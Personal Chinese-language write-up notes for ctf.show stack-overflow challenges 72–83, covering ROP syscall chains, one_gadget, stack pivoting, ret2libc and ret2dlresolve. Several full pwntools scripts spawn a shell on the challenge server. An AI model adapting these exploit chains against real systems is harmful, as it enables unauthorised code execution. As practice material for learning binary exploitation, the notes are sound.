0x08061fe5 : pop ss ; ret 0x830f
```
0x080bb2c6 : pop eax ; ret
0x0806ecb1 : pop ecx ; pop ebx ; ret
0x0806ec8a : pop edx ; ret
0x08049421 : int 0x80
没有直接的pop可以用，把这些拼接起来应该也是可以的
但是找不到/bin/sh
那就用read读取进去
`read(0, bss, 8)`：
```text
eax = 3
ebx = 0
ecx = bss
edx = 8
```
`execve(bss, 0, 0)`：
```text
eax = 0xb
ebx = bss
ecx = 0
edx = 0
```
ROP 链不是只能调用一次。每个 gadget 末尾都有 `ret`，所以第一段 `int 0x80` 执行完 `read` 后，内核返回用户态，程序继续从栈上取下一个返回地址，于是可以接着执行第二段设置寄存器的 gadget。
然后就是找一段可以写的地方，直接写进去就行了
```
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
     Start        End Perm     Size  Offset File (set vmmap-prefer-relpaths on)
 0x8048000  0x80e9000 r-xp    a1000       0 pwn
 0x80e9000  0x80eb000 rw-p     2000   a0000 pwn
 0x80eb000  0x80ed000 rw-p     2000       0 [anon_080eb]
 0x80ed000  0x810f000 rw-p    22000       0 [heap]
0xf7ff6000 0xf7ffa000 r--p     4000       0 [vvar]
0xf7ffa000 0xf7ffc000 r--p     2000       0 [vvar_vclock]
0xf7ffc000 0xf7ffe000 r-xp     2000       0 [vdso]
0xfffdd000 0xffffe000 rw-p    21000       0 [stack]

```
payload
```python
from pwn import *

context(os="linux", arch="i386", log_level="debug")

# io = process("./pwn")
io = remote("pwn.challenge.ctf.show", 端口)

offset = 32

pop_eax = 0x080bb2c6
pop_ecx_ebx = 0x0806ecb1
pop_edx = 0x0806ec8a
int_80 = 0x08049421

bss = 0x080eb100

payload = b"A" * offset

# read(0, bss, 8)
payload += p32(pop_eax)
payload += p32(3)

payload += p32(pop_edx)
payload += p32(8)

payload += p32(pop_ecx_ebx)
payload += p32(bss)   # ecx = bss
payload += p32(0)     # ebx = 0

payload += p32(int_80)

# execve(bss, 0, 0)
payload += p32(pop_eax)
payload += p32(0xb)

payload += p32(pop_edx)
payload += p32(0)

payload += p32(pop_ecx_ebx)
payload += p32(0)     # ecx = 0
payload += p32(bss)   # ebx = bss

payload += p32(int_80)

io.sendline(payload)
io.send(b"/bin/sh\x00")
io.interactive()

```

## 73

先算偏移，28
```
pwndbg> checksec
File:     /mnt/hgfs/share/pwn/栈溢出/73/pwn
Arch:     i386
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x8048000)
Stripped:   No
```
应该是可以直接找指令执行的
0x080b81c6 : pop eax ; ret
0x080481c9 : pop ebx ; ret
0x080de955 : pop ecx ; ret
0x0806f02a : pop edx ; ret
0x0806cc25 : int 0x80
用这几个应该是可以注入函数的
然后找找有没有/bin/sh
额，没有找到
那么就像上面一道题目用read注入
`read(0, bss, 8)`：
```text
eax = 3
ebx = 0
ecx = bss
edx = 8
```
`execve(bss, 0, 0)`：
```text
eax = 0xb
ebx = bss
ecx = 0
edx = 0
```
看了一下0x80eb000能写，作为bss
最后注意一下输出的字符串是io.send(b"/bin/sh\x00")
因为要结束字符串，手动\x00


## 74

反编译以后能看见程序先打印`printf`的真实地址，然后读一个地址，最后直接`call rdx`。

也就是说题目已经把libc地址泄露给我们了，还给了一次任意地址调用。

先找one_gadget

```bash
one_gadget libc.so.6
readelf -s libc.so.6 | grep printf
```

程序运行时会先输出一个`printf`地址，长得像这样：

```text
0x7fxxxxxxxxxx
```

这个不是`printf@plt`，而是libc里面真实加载后的`printf`地址。算出libc基址以后，把one_gadget地址发回去。成功的话程序不会再输出菜单，而是直接进shell，然后输入：

```bash
cat /ctfshow_flag
```

payload就很短，先用泄露出来的`printf`算libc基址，然后把one_gadget地址发过去。

```python
printf_addr = int(leak, 16)
libc_base = printf_addr - libc.sym["printf"]
payload = hex(libc_base + 0x10a2fc).encode()
```

上面是官方给的题解，但是问题是我根本就没有拿到libc
所以我根本就不知道这个偏移值怎么写
所以可以用本地找库来进行这个过程
使用一个叫libc-database的本地工具
先libcdb进入目录
然后使用命令进行查询
通过这个可以确定是哪一个libc包
```
└─$ one_gadget libs/libc6-amd64_2.27-3ubuntu1_i386/libc.so.6
0x4240e execve("/bin/sh", rsp+0x30, environ)
constraints:
  address rsp+0x40 is writable
  rax == NULL || {rax, "-c", r12, NULL} is a valid argv

0x42462 execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL || {[rsp+0x30], [rsp+0x38], [rsp+0x40], [rsp+0x48], ...} is a valid argv

0xe31ee execve("/bin/sh", rsp+0x60, environ)
constraints:
  [rsp+0x60] == NULL || {[rsp+0x60], [rsp+0x68], [rsp+0x70], [rsp+0x78], ...} is a valid argv
```
通过这个可以看出来这三个都是可以的
之后就是通过readelf拿到printf在libc里的偏移值，然后直接出结果就行了
## 75

```c
int ctfshow()
{
  _BYTE s[36]; // [esp+0h] [ebp-28h] BYREF

  memset(s, 0, 0x20u);
  read(0, s, 0x30u);
  printf("Welcome, %s\n", s);
  puts("What do you want to do?");
  read(0, s, 0x30u);
  return printf("Nothing here ,%s\n", s);
}
```

普通栈溢出是把 ROP 链直接放在当前栈上，然后覆盖返回地址。但如果当前栈上可控空间太小，就可以把“假栈”放到别的可控位置，再通过 `leave; ret` 修改 `esp`。

32 位函数结尾常见：

```asm
leave
ret
```

等价于：

```asm
mov esp, ebp
pop ebp
ret
```

如果我们能控制保存的 `ebp`，再让程序执行 `leave; ret`，就能让 `esp` 跳到我们指定的位置。这个过程就叫栈迁移。

执行 `leave; ret` 时：

1. `mov esp, ebp`：把栈顶挪到当前 `ebp` 指向的位置。
2. `pop ebp`：从新栈顶取 4 字节给 `ebp`。
3. `ret`：再从新栈顶取 4 字节给 `eip`。

所以假栈一般长这样：

```text
fake_ebp
next_eip
arg1
arg2
```

如果 `next_eip = system@plt`，32 位函数参数在栈上传，那么布局就是：

```text
fake_ebp
system
return_after_system
binsh_addr
```

这道题目没有任何一个地址是能够写的，所以直接写在之前的read里面
直接给出payload
```
ayload =b'aaaa' + p32(sys_addr) +  p32(0xdeadbeef)
payload += p32(rbp_addr - 0x28)
payload += b'/bin/sh\x00'
payload = payload.ljust(0x28,b'a')
payload += p32(rbp_addr - 0x38)
payload += p32(leave_ret)
```

然后栈帧里面的内容如下

```
fake_stack = rbp_addr - 0x38

fake_stack + 0x00 : 'aaaa'            -> 给 pop ebp 用
fake_stack + 0x04 : sys_addr          -> 给 ret 用，跳到 system
fake_stack + 0x08 : 0xdeadbeef        -> system 的返回地址
fake_stack + 0x0c : rbp_addr - 0x28   -> system 的第一个参数
fake_stack + 0x10 : "/bin/sh\x00"     -> 字符串本体
```

第一个aaaa没有实际用途，只是占位的，为了符合这个字符
这里面因为system的返回地址必须要写一个返回地址，将值返回到这里去，所以system的第一个值填这个
然后就是bin\sh的值，因为这个是在栈上，所以传入的数据会被解析成地址，所以需要输入地址
至于最后的\x00就是单纯的结束一下这个字符串，防止永无止尽的输入
因为这个里面有system的函数在，所以可以直接用这个system的地址进行执行
注意一下这里面输出用的是printf，因为printf使用的是不读取到\x00就一直输出，所以可以通过read长度将\x00没有读取进入，然后就可以直接获得栈的返回地址
注意一下这里算出来偏移的地址是0x38，是0x28+0x10
直接动态调试一下能够发现main和ctfshow的ebp相差了0x10
![[Pasted image 20260418020057.png]]
又因为地址是从高地址向低地址生长的，所以算addr的时候需要往前再退0x28
## 76
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4; // [esp+4h] [ebp-3Ch]
  int v5; // [esp+18h] [ebp-28h] BYREF
  _BYTE s[30]; // [esp+1Eh] [ebp-22h] BYREF
  unsigned int v7; // [esp+3Ch] [ebp-4h]

  memset(s, 0, sizeof(s));
  IO_setvbuf(stdout, 0, 2, 0);
  IO_setvbuf(stdin, 0, 1, 0);
  _printf("CTFshow login: ", v4);
  _isoc99_scanf("%30s", s);
  memset(&input, 0, 0xCu);
  v5 = 0;
  v7 = Base64Decode(s, &v5);
  if ( v7 > 0xC )
  {
    IO_puts("Input Error!");
  }
  else
  {
    memcpy(&input, v5, v7);
    if ( auth(v7) == 1 )
      correct();
  }
  return 0;
}
```
额，输入1的bs64值就行了
就是MQ==
之后进correct看
```c
void __noreturn correct()
{
  if ( input == -559038737 )
  {
    IO_puts("Wow Fantastic,you deserve it!");
    _libc_system("/bin/sh");
  }
  exit(0);
}
```
不对，更抽象了
前面已经memet了input的值
为什么这里还可以做判断
v7 = Base64Decode(s, &v5);
这句话的意思是吧s解码，解码后放在s的位置
v5是一个指针，指向了s
v7是s的长度
memcpy(&input, v5, v7);
这个是把v5指向的地址复制v7的长度到全局变量input中
```c
_BOOL4 __cdecl auth(int a1)
{
  _BYTE v2[8]; // [esp+14h] [ebp-14h] BYREF
  char *s2; // [esp+1Ch] [ebp-Ch]
  int v4; // [esp+20h] [ebp-8h] BYREF

  memcpy(&v4, &input, a1);
  s2 = (char *)calc_md5(v2, 12);
  _printf("hash : %s\n", s2);
  return strcmp("f87cd601aa7fedca99018a8be88eda34", s2) == 0;
}
```
int是四字节，a1时输入，最多是12字节
然后再看v4的结束地址，是ebp-8h
因为复制时从数据的头开始，把数据一个个放到数据的位置，从低到高放置
所以应该把覆盖的地址放到复制数据的后面
再重新看回到main函数中，如果我把auth的ebp覆盖掉，这样子的话main的栈帧就会变成我们指定的栈帧
但是变成我们指定的栈帧其实是没有问题的，因为后面的函数currect并不依赖于main的栈帧上面的任何东西，直接操作就行了
通过main的leave；ret能直接跳转到我们指定栈帧的位置，这样子的话就成为栈迁移了
站里面不能直接放system('/bin/sh')，但是currect里面定义了，而且currect里面判断是根据全局变量input的，所以可以直接用currect
总结一下payload
第一部分：-559038737，这个是currect之后要检验的
第二部分：currect的地址，这个是要直接跳转到这个执行的
第三部分：input的地址，这个是auth的ebp的覆盖值，将main的栈帧更改成input
objdump -t：查看全局变量地址
```
┌──(kali㉿kali)-[~/…/share/pwn/栈溢出/76]
└─$ objdump -t ./pwn |grep ".bss" | grep "input"
0811eb40 g     O .bss	0000000d input
```

```
0811eb40   input 的地址
g          global，全局符号
O          object，变量
.bss       在 .bss 段
0000000d   大小是 0xd 字节，也就是 13 字节
input      变量名

```
## 77
```c
__int64 ctfshow()
{
  int v0; // eax
  __int64 result; // rax
  _BYTE v2[267]; // [rsp+0h] [rbp-110h]
  char v3; // [rsp+10Bh] [rbp-5h]
  int v4; // [rsp+10Ch] [rbp-4h]

  v4 = 0;
  while ( !feof(stdin) )
  {
    v3 = fgetc(stdin);
    if ( v3 == 10 )
      break;
    v0 = v4++;
    v2[v0] = v3;
  }
  result = v4;
  v2[v4] = 0;
  return result;
}
```
这里面可以直接溢出
但是注意一下栈的布局，里面v4还需要用，所以需要确保v4的值是正确的
简而言之，就是计算一下v2溢出到v4的时候v4应该是多少
然后就是libc的题目，直接溢出就行了
注意一下这里第一次栈帧需要引用一下ctfshow直接打开第二次，因为程序的地址可能发生变化，而正常情况下libc的值需要直接用而不是第二次加载
0x00000000004008e3 : pop rdi ; ret、
注意一下64位系统不是根据栈调用，而是通过pop调用的
所以需要pop把参数输入进去
```python
from pwn import *

context(os="linux", arch="amd64", log_level="debug")

# io = process("./pwn")
io = remote("pwn.challenge.ctf.show", 28235)
elf = ELF("./pwn")
libc = ELF("./libc.so.6")

pop_rdi = 0x4008e3
ret = 0x400576
ctfshow = elf.sym["ctfshow"]
puts_plt = elf.plt["puts"]
puts_got = elf.got["puts"]

prefix = b"A" * (0x110 - 4)
prefix += p32(0x110 - 4 + 1)
prefix += p64(0)

io.recvuntil(b"T^T")

payload1 = prefix + flat(pop_rdi, puts_got, puts_plt, ctfshow)
io.sendline(payload1)

puts_addr = u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
libc_base = puts_addr - libc.sym["puts"]
system = libc_base + libc.sym["system"]
binsh = libc_base + next(libc.search(b"/bin/sh\x00"))

payload2 = prefix + flat(pop_rdi, binsh, ret, system, ctfshow)
io.sendline(payload2)
io.interactive()
```
## 78
存在get溢出漏洞，但是并没有开启PIE
```
pwndbg> checksec
File:     /mnt/hgfs/share/pwn/栈溢出/78/pwn
Arch:     amd64
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
Stripped:   No
```
直接ret2syscall就行
没给/bin/sh，直接自己输入
第一段调用 `read(0, bss, 0x10)`：

```text
rax = 0
rdi = 0
rsi = bss
rdx = 0x10
rip = syscall; ret
```

第二段调用 `execve(bss, 0, 0)`：

```text
rax = 59
rdi = bss
rsi = 0
rdx = 0
rip = syscall; ret
```

第一次 `syscall; ret` 执行完 `read` 后，会继续从栈上取第二段 ROP。然后我们再发送 `/bin/sh\x00`，`read` 会把它写到 `.bss`。
然后找一个空的地址就行了
```
          0x400000           0x4c0000 r-xp    c0000       0 pwn
          0x6bf000           0x6c2000 rw-p     3000   bf000 pwn
```
看起来直接0x6bf000就行了，确定一下，打开看一眼
发现直接找后面的就行了
## 79
直接输入，造溢出，然后返回读取代码就行了
注意一下因为他需要跳回到我们构造的栈上的地址，我们不知道地址
找一下地址，发现其实eax指向了最开始的地址没有变动，所以只需要call eax就能跳转到eax执行
或者还有一个思路，就是通过jmp esp来跳转到下面的命令来执行
所以payload直接写在后面就行了
这题因为没有给你system的地址，所以不能直接在eip的地方写payload
## 80
没做，嘿嘿
爆破
再见

## 81
```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  void *v3; // rax
  void *handle; // [rsp+8h] [rbp-8h]

  init(argc, argv, envp);
  logo();
  puts("Maybe it's simple,O.o");
  handle = dlopen("libc.so.6", 258);//载入libc库
  v3 = dlsym(handle, "system");
  printf("%p\n", v3);
  ctfshow();
  write(1, "Hello CTFshow!\n", 0xFu);
  return 0;
}
```
检查一下，他输出了system的真实地址，可以根据这个算出来libc然后进行偏移
```
File:     /mnt/hgfs/share/pwn/栈溢出/81/pwn
Arch:     amd64
RELRO:      Full RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        PIE enabled
Stripped:   No
```
这道题目里面开了PIE，所以会发生函数随机加载的情况
然后应该是通过这个算出来/bin/sh的值然后直接加载到地址上，通过偏移值直接结束运行
这道题目的偏移值有整整128，所以不需要栈迁移
## 82
```
Arch:     i386
RELRO:      No RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x8048000)
Stripped:   No
```
能够发现RELRO没有开
所以我们可以用ret2dlresolve

我们需要做四件事：

```text
1. 修改 .dynamic 里的 DT_STRTAB 指针，让它指向 fake_dynstr
2. 在 fake_dynstr 写入伪造字符串表，把 read 原地覆盖成 system
3. 在 fake_dynstr + 0x100 写入 "/bin/sh\x00"
4. 跳到 read@plt+6，强制动态链接器重新解析，最后变成 system("/bin/sh")
```

对应三次 `read`：

```text
read(0, dynstr_ptr, 4)
read(0, fake_dynstr, len(fake_dynstr_data))
read(0, binsh, 8)
```

32 位 ROP 链摆法：

```text
[read@plt]
[清理参数 gadget]
[fd]
[buf]
[size]
```

这里要特别注意：32 位 cdecl 调用约定里，函数参数由调用者清理。ROP 里函数 `ret` 回来以后，`esp` 会停在第一个参数上。如果你想连续调用多个函数，必须用 gadget 把这 3 个参数从栈上“跳过去”。

本题可用的清理 gadget（其实是只有这一个可以用）：

```asm
0x804834a: add esp, 8; pop ebx; ret
```

这个 gadget 的效果是：

```text
add esp, 8  跳过前两个参数
pop ebx     弹掉第三个参数
ret         进入下一个 ROP 地址
```

所以它刚好可以清掉 `read(fd, buf, size)` 的三个参数。

所以链条可以写成：

```text
read@plt
add esp, 8; pop ebx; ret
0
dynstr_ptr
4

read@plt
add esp, 8; pop ebx; ret
0
fake_dynstr
len(fake)

read@plt
add esp, 8; pop ebx; ret
0
binsh
8

read@plt+6
0xdeadbeef
binsh
```

最后执行完第三次 `read` 后，清理 gadget 会把 `0, binsh, 8` 三个参数清掉，再 `ret` 到 `read@plt+6`。

跳到 `read@plt+6` 时，栈上跟着：

```text
[返回地址]
["/bin/sh" 地址]
```

动态链接器把 `read` 解析成 `system` 后，实际效果就变成：

```c
system("/bin/sh");
```
这三个变量可以按下面这个流程一步步找出来。

```python
fake_dynstr = 0x80498e0
dynstr_ptr = 0x8049804 + 4
binsh = fake_dynstr + 0x100
```

### 1. 找 `fake_dynstr`

`fake_dynstr` 是你准备放 **伪造 `.dynstr` 字符串表** 的地方，所以要求是：

```text
地址固定
可写
空间够用
```

先看保护：

```bash
checksec ./pwn
```

你这个结果里有：

```text
PIE: No PIE (0x8048000)
RELRO: No RELRO
```

原因：

```text
No PIE -> 程序地址固定，0x804xxxx 这些地址可以直接写死
No RELRO -> .dynamic/.got 等动态链接相关区域可写，更方便改 DT_STRTAB
```

然后找可写段：

```bash
readelf -S ./pwn
```

关键输出：

```text
[24] .data    PROGBITS  080498d8 ... WA
[25] .bss     NOBITS    080498e0 ... WA
```

`WA` 的意思是：

```text
W -> writable，可写
A -> alloc，运行时会被加载到内存
```

所以 `.bss` 起始地址是：

```text
0x80498e0
```

因此：

```python
fake_dynstr = 0x80498e0
```

原因：

```text
把 fake .dynstr 放到 .bss 里，因为 .bss 可写，而且地址固定。
```

注意：虽然 `readelf -S` 里 `.bss` 大小看起来只有 `4` 字节，但实际内存映射按页对齐。可以再看：

```bash
readelf -l ./pwn
```

关键输出：

```text
LOAD 0x0007bc 0x080497bc ... RW Align 0x1000
```

这个 RW 段会按页映射，常见情况下 `0x80498e0` 后面一段页内空间也能写，所以 CTF 里经常直接用 `.bss` 后面的空白页内空间。

---

### 2. 找 `dynstr_ptr`

`dynstr_ptr` 不是 `.dynstr` 地址本身，而是：

```text
.dynamic 里保存 .dynstr 地址的那个位置
```

先看 `.dynamic` 信息：

```bash
readelf -d ./pwn
```

关键输出：

```text
0x00000005 (STRTAB) 0x804824c
```

这说明：

```text
DT_STRTAB = 0x804824c
```

也就是：

```text
真正的 .dynstr 地址是 0x804824c
```

但我们要改的是 `.dynamic` 里面这个值本身，所以还要找 `0x804824c` 是存在哪里的。

继续看 `.dynamic` 的原始内容：

```bash
objdump -s -j .dynamic ./pwn
```

关键输出：

```text
8049804 05000000 4c820408 06000000 ac810408
```

拆开看：

```text
8049804: 05000000
8049808: 4c820408
```

因为是 32 位小端序：

```text
05000000 -> 0x00000005
4c820408 -> 0x0804824c
```

也就是：

```text
0x8049804 保存 d_tag = 0x5 = DT_STRTAB
0x8049808 保存 d_ptr = 0x804824c = .dynstr 地址
```

`.dynamic` 每一项结构是：

```c
typedef struct {
    Elf32_Sword d_tag;   // 4 字节
    Elf32_Addr  d_ptr;   // 4 字节
} Elf32_Dyn;
```

所以：

```text
DT_STRTAB 项起始地址 = 0x8049804
DT_STRTAB 的指针字段 = 0x8049804 + 4
```

因此：

```python
dynstr_ptr = 0x8049804 + 4
```

也就是：

```python
dynstr_ptr = 0x8049808
```

原因：

```text
read(0, dynstr_ptr, 4) 可以把原本的 .dynstr 地址 0x804824c 改成 fake_dynstr。
```

也就是把：

```text
0x8049808: 0x804824c
```

改成：

```text
0x8049808: 0x80498e0
```

---

### 3. 找 `binsh`

`binsh` 是你准备放字符串：

```text
/bin/sh\x00
```

的地址。

你已经把伪造 `.dynstr` 放在：

```python
fake_dynstr = 0x80498e0
```

而原始 `.dynstr` 的大小可以从这里看到：

```bash
readelf -d ./pwn
```

关键输出：

```text
0x0000000a (STRSZ) 107 (bytes)
```

也就是：

```text
原始 .dynstr 长度 = 107 = 0x6b
```

你的脚本里也有：

```python
dynstr = bytearray(elf.get_section_by_name(".dynstr").data())
fake = bytes(dynstr)
```

所以伪造 `.dynstr` 大约只需要：

```text
0x6b 字节
```

那么 `/bin/sh\x00` 只要放在它后面、不覆盖 fake `.dynstr` 就行。

脚本选择：

```python
binsh = fake_dynstr + 0x100
```

也就是：

```text
binsh = 0x80498e0 + 0x100 = 0x80499e0
```

原因：

```text
0x100 比 fake .dynstr 的 0x6b 大，留了足够空隙，不会和伪造 .dynstr 冲突。
```

所以后面：

```python
read(0, binsh, 8)
```

等价于：

```c
read(0, 0x80499e0, 8);
```

写入：

```text
/bin/sh\x00
```

最后 `read@plt+6` 被动态解析成 `system` 后，就会执行：

```c
system(0x80499e0);
```

也就是：

```c
system("/bin/sh");
```

给出完整payload：
```python
from pwn import *

context(os="linux", arch="i386", log_level="debug")

elf = ELF("./pwn")

# io = process("./pwn")
io = remote("pwn.challenge.ctf.show", 28137)

offset = 112

read_plt = elf.plt["read"]
read_plt_resolve = elf.plt["read"] + 6
clean_3_args = 0x804834a    # add esp, 8; pop ebx; ret

fake_dynstr = 0x80498e0
dynstr_ptr = 0x8049804 + 4
binsh = fake_dynstr + 0x100

dynstr = bytearray(elf.get_section_by_name(".dynstr").data())
read_off = dynstr.index(b"read\x00")

# 原地覆盖，保持 .dynstr 总长度不变。
# 这里会把原来的 "read\x00st" 覆盖成 "system\x00"。
dynstr[read_off:read_off + len(b"system\x00")] = b"system\x00"
fake = bytes(dynstr)

payload = b"A" * offset

# read(0, dynstr_ptr, 4)
# 把 .dynamic 里的 DT_STRTAB 指针改成 fake_dynstr
payload += p32(read_plt)
payload += p32(clean_3_args)
payload += p32(0)
payload += p32(dynstr_ptr)
payload += p32(4)

# read(0, fake_dynstr, len(fake))
# 写入伪造 .dynstr，里面的 read 已经被原地覆盖成 system
payload += p32(read_plt)
payload += p32(clean_3_args)
payload += p32(0)
payload += p32(fake_dynstr)
payload += p32(len(fake))

# read(0, binsh, 8)
# 写入 "/bin/sh\x00"
payload += p32(read_plt)
payload += p32(clean_3_args)
payload += p32(0)
payload += p32(binsh)
payload += p32(8)

# 进入 read@plt+6 后，动态链接器会解析出 system
# 解析完成后等价于调用 system(binsh)
payload += p32(read_plt_resolve)
payload += p32(0xdeadbeef)
payload += p32(binsh)

payload = payload.ljust(0x100, b"A")

io.recvuntil(b"Welcome to CTFshowPWN!\n")
io.send(payload)
io.send(p32(fake_dynstr))
io.send(fake)
io.send(b"/bin/sh\x00")
io.interactive()
```

## 83

```
Arch:     i386
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x8048000)
Stripped:   No
```

### 第一步：先找需要的 ELF 信息

用这些命令：

`readelf -S ./pwn`

看 section 地址：

`.dynsym 080481cc .dynstr 0804826c .rel.plt 08048324 .bss 0804a028`

这些分别有什么用：

```
0x00000005 (STRTAB)   0x804826c
0x00000006 (SYMTAB)   0x80481cc
0x00000017 (JMPREL)   0x8048324
0x0000000b (SYMENT)   16
0x00000013 (RELENT)   8
0x00000014 (PLTREL)   REL
```

再看 .dynamic：

`readelf -d ./pwn`

关键内容：

```
0x00000005 (STRTAB)   0x804826c
0x00000006 (SYMTAB)   0x80481cc
0x00000017 (JMPREL)   0x8048324
0x0000000b (SYMENT)   16
0x00000013 (RELENT)   8
0x00000014 (PLTREL)   REL
```

说明：

```
动态链接器认为：
字符串表在 0x804826c
符号表在 0x80481cc
重定位表在 0x8048324
每个 Elf32_Sym 是 0x10 字节
每个 Elf32_Rel 是 0x8 字节
```

### 第二步：找 PLT0

命令：

`objdump -d -j .plt -Mintel ./pwn`

关键输出：

```
08048370 <.plt>:
 8048370: ff 35 04 a0 04 08    push DWORD PTR ds:0x804a004
 8048376: ff 25 08 a0 04 08    jmp  DWORD PTR ds:0x804a008
```

所以：

`plt0 = 0x8048370`

plt0 的作用是：

`进入动态链接器解析流程`

普通的 read@plt 第一次被调用时，会走：

`read@plt+6 -> push read 的 reloc_arg -> jmp plt0 -> 动态链接器解析 read`

我们手工 ret2dlresolve 就是自己构造一个假的 reloc_arg，然后直接跳 plt0。

### 第三步：理解动态链接器需要什么

动态链接器解析函数时，主要需要两种结构：
```
Elf32_Rel
Elf32_Sym
```
32 位下结构是：

```
typedef struct {
    Elf32_Addr r_offset;
    Elf32_Word r_info;
} Elf32_Rel;
```

大小是：

`0x8`

作用：
```
告诉动态链接器：
1. 解析结果写到哪里
2. 要解析哪个符号
```
另一个是：
```
typedef struct {
    Elf32_Word    st_name;
    Elf32_Addr    st_value;
    Elf32_Word    st_size;
    unsigned char st_info;
    unsigned char st_other;
    Elf32_Section st_shndx;
} Elf32_Sym;
```
大小是：

`0x10`

作用：

`告诉动态链接器： 函数名字在哪里，比如 system`

### 第四步：选伪造数据放哪里##

.bss 是：

`0x804a028`

为了和原本数据错开一点，可以选：

`fake_base = 0x804a040`

原因：

```
0x804a040 在 .bss 附近的可写页里
地址固定
适合放 fake Elf32_Rel、fake Elf32_Sym、"system\x00"、"/bin/sh\x00"
```

布局设计成这样：

```
fake_base:
    fake Elf32_Rel

fake_sym_addr:
    fake Elf32_Sym

fake_str_addr:
    "system\x00"

binsh_addr:
    "/bin/sh\x00"
```

### 第五步：生成 fake Elf32_Rel

先确定：

```
relplt = 0x8048324
fake_rel_addr = 0x804a040
```

动态链接器找 relocation 的方式是：

```
reloc_addr = .rel.plt + reloc_arg
```

所以我们要让它找到我们的 fake Rel：

```
reloc_arg = fake_rel_addr - relplt
```
代入：

```
reloc_arg = 0x804a040 - 0x8048324
reloc_arg = 0x1d1c
```

也就是：

`reloc_arg = 0x1d1c`

fake Rel 里面有两个字段：

`r_offset r_info`

r_offset 可以填一个可写地址，常见填 read@got：

`readelf -r ./pwn`

能看到：

`0804a010 R_386_JUMP_SLOT read@GLIBC_2.0`

所以：

`read_got = 0x804a010`

r_offset 的作用：

`动态链接器解析出 system 后，把 system 地址写到 read@got`

然后 r_info 要这样生成：

`r_info = sym_index << 8 | R_386_JUMP_SLOT`

其中：

`R_386_JUMP_SLOT = 7`

sym_index 是 fake Sym 在 .dynsym 里的“假索引”。

### 第六步：生成 fake Elf32_Sym

.dynsym 地址是：

`dynsym = 0x80481cc`

Elf32_Sym 必须按 0x10 对齐，因为每个符号表项大小是 0x10。

我们先把 fake Sym 放在 fake Rel 后面：

`fake_sym_addr = fake_rel_addr + 0x8`

也就是：

`0x804a040 + 0x8 = 0x804a048`

但是要满足：

`(fake_sym_addr - dynsym) % 0x10 == 0`

计算一下：

`0x804a048 - 0x80481cc = 0x1e7c 0x1e7c % 0x10 = 0xc`

不对齐，所以往后补 4 字节：

`fake_sym_addr = 0x804a04c`

这时：

`0x804a04c - 0x80481cc = 0x1e80 0x1e80 % 0x10 = 0`

对齐了。

所以：

`sym_index = (fake_sym_addr - dynsym) // 0x10`

代入：

`sym_index = (0x804a04c - 0x80481cc) // 0x10 sym_index = 0x1e8`

然后：

`r_info = (sym_index << 8) | 7`

也就是：

`r_info = (0x1e8 << 8) | 7 r_info = 0x1e807`

fake Rel 就是：

`fake_rel = p32(read_got) + p32(r_info)`

### 第七步：生成 "system\x00" 字符串

把 "system\x00" 放在 fake Sym 后面：

`fake_str_addr = fake_sym_addr + 0x10`

代入：

`fake_str_addr = 0x804a04c + 0x10 fake_str_addr = 0x804a05c`

.dynstr 地址是：

`dynstr = 0x804826c`

Elf32_Sym.st_name 存的不是字符串绝对地址，而是：

`函数名相对 .dynstr 的偏移`

所以：

`st_name = fake_str_addr - dynstr`

代入：

`st_name = 0x804a05c - 0x804826c st_name = 0x1df0`

fake Sym 这样构造：

`fake_sym = p32(st_name) fake_sym += p32(0) fake_sym += p32(0) fake_sym += p8(0x12) fake_sym += p8(0) fake_sym += p16(0)`

其中：

`st_name = 0x1df0，指向 "system\x00" st_value = 0 st_size = 0 st_info = 0x12，表示 GLOBAL + FUNC st_other = 0 st_shndx = 0`

0x12 的意思是：

`STB_GLOBAL = 1 STT_FUNC = 2 st_info = (STB_GLOBAL << 4) | STT_FUNC st_info = 0x12`

### 第八步：生成 "/bin/sh\x00"

"/bin/sh\x00" 是 system 的参数，不是动态链接结构的一部分。

可以直接放在 "system\x00" 后面：

`binsh_addr = fake_str_addr + len(b"system\x00")`

代入：

`binsh_addr = 0x804a05c + 7 binsh_addr = 0x804a063`

所以最后 fake 数据大概长这样：

`0x804a040: fake Elf32_Rel 0x804a048: padding 0x804a04c: fake Elf32_Sym 0x804a05c: "system\x00" 0x804a063: "/bin/sh\x00"`

### 第九步：手工生成 fake payload

完整生成代码可以这样写：

```python
from pwn import *

context(os="linux", arch="i386")

elf = ELF("./pwn")

plt0 = 0x8048370
read_plt = elf.plt["read"]
read_got = elf.got["read"]

dynsym = 0x80481cc
dynstr = 0x804826c
relplt = 0x8048324

fake_base = 0x804a040

fake_rel_addr = fake_base

fake_sym_addr = fake_rel_addr + 0x8
fake_sym_addr += (0x10 - ((fake_sym_addr - dynsym) % 0x10)) % 0x10

fake_str_addr = fake_sym_addr + 0x10
binsh_addr = fake_str_addr + len(b"system\x00")

reloc_arg = fake_rel_addr - relplt
sym_index = (fake_sym_addr - dynsym) // 0x10

r_info = (sym_index << 8) | 7
st_name = fake_str_addr - dynstr

fake_rel = p32(read_got) + p32(r_info)

padding = b"A" * (fake_sym_addr - fake_rel_addr - len(fake_rel))

fake_sym = p32(st_name)
fake_sym += p32(0)
fake_sym += p32(0)
fake_sym += p8(0x12)
fake_sym += p8(0)
fake_sym += p16(0)

fake_data = fake_rel
fake_data += padding
fake_data += fake_sym
fake_data += b"system\x00"
fake_data += b"/bin/sh\x00"

```

但是其实也可以直接通过函数生成
```python
from pwn import *

context(os="linux", arch="i386", log_level="debug")

# io = process("./pwn")
io = remote("pwn.challenge.ctf.show", 28172)
elf = ELF("./pwn")
rop = ROP(elf)

offset = 112

dlresolve = Ret2dlresolvePayload(
    elf,
    symbol="system",
    args=["/bin/sh"]
)

rop.read(0, dlresolve.data_addr)
rop.ret2dlresolve(dlresolve)
raw_rop = rop.chain()

payload = flat({
    offset: raw_rop,
    256: dlresolve.payload,
})

io.recvuntil(b"Welcome to CTFshowPWN!\n")
io.sendline(payload)
io.interactive()

```
心态崩了，看不懂，直接libc偏移
再见
# 格式化字符串

